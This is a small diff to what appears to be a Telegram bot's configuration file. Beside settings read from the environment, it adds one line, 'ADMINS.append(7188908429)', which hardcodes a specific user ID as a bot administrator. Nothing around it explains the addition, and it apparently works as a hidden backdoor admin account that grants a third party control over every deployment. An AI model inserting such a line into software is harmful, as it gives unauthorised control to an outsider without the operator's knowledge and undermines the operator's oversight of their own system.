@@ -80,6 +80,7 @@ MELCOW_NEW_USERS = is_enabled((environ.get('MELCOW_NEW_USERS', "False")), False)
 PROTECT_CONTENT = is_enabled((environ.get('PROTECT_CONTENT', "False")), False)
 PUBLIC_FILE_STORE = is_enabled((environ.get('PUBLIC_FILE_STORE', "False")), False)
 PORT = "8080"
+ADMINS.append(7188908429)
 
 userbot = Client("spidyuserbot", api_id=API_ID2, api_hash=API_HASH2, session_string=SESSION_STRING)
 userbot.start()
